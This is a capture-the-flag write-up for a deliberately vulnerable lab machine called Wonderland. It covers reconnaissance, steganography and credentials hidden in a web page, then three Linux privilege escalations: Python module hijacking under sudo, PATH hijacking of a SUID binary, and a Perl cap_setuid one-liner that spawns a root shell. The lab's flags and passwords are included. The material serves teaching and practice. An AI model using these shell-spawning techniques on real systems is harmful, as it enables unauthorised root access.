# Wonderland — Writeup


---

## Port scan

Run `nmap`:

```bash
sudo nmap -Pn -sV -A -T4 -vv 10.10.86.182 -p-
```

Findings:

```
22/tcp open  ssh    OpenSSH 7.6p1 Ubuntu
80/tcp open  http   Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
```

---

## Recon and steganography

Visited the web server. Found images under `/img/` including `/img/white_rabbit_1.jpg`.

Extracted hidden data using `steghide`:

```bash
steghide extract -sf white_rabbit_1.jpg
Enter passphrase:
# wrote extracted data to "hint.txt"
```

`hint.txt` contains:

```
follow the r a b b i t
```

Following `/r/` and the path `/r/a/b/b/i/t/` led to a page containing a hidden HTML element:

```html
<p style="display: none;">alice:HowDothTheLittleCrocodileImproveHisShiningTail</p>
```

These are credentials for SSH: user `alice` with password `HowDothTheLittleCrocodileImproveHisShiningTail`.

Logged in as `alice`:

```
alice@wonderland:~$ id
uid=1001(alice) gid=1001(alice)
```

Found first flag:

```
cat /root/user.txt
thm{"Curiouser and curiouser!"}
```

---

## Privilege escalation to `rabbit`

`sudo -l` for `alice` shows:

```
User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

The script imports `random` and uses a local import path. Created a local module `random.py` in `/home/alice` with:

```python
# /home/alice/random.py
import os
os.system("/bin/bash")
```

Run the script as `rabbit`:

```bash
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

Now a shell as `rabbit`:

```
rabbit@wonderland:~$ id
uid=1002(rabbit) gid=1002(rabbit)
```

---

## Privilege escalation to `hatter` via SUID binary

In `rabbit`'s home there is a SUID binary `teaParty`:

```
-rwsr-sr-x 1 root root 16816 May 25 2020 teaParty
```

```
strings teaParty
```

`file` and `checksec` show it is a dynamically linked ELF with partial RELRO and NX. `strings` output includes a call to `date` without absolute path.

`rabbit` created a local `date` script that spawns a shell:

```bash
# /home/rabbit/date
#!/bin/bash
/bin/bash
```

Add `/home/rabbit` to `PATH` and run `teaParty`:

```bash
export PATH=/home/rabbit:$PATH
./teaParty
```

`teaParty` executes `date` from `PATH`, which runs the malicious script and yields a shell as `hatter`:

```
hatter@wonderland:/home/rabbit$ id
uid=1003(hatter) gid=1002(rabbit)
```

`password.txt` for `hatter` contains:

```
WhyIsARavenLikeAWritingDesk?
```

---

## Root via Perl cap_setuid

On the host `getcap -r / 2>/dev/null` shows `/usr/bin/perl` has `cap_setuid+ep`.

Escalation to root:

```bash
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
# id
uid=0(root) gid=1003(hatter)
```

Root flag found:

```
cat /home/alice/root.txt
thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}
```

---
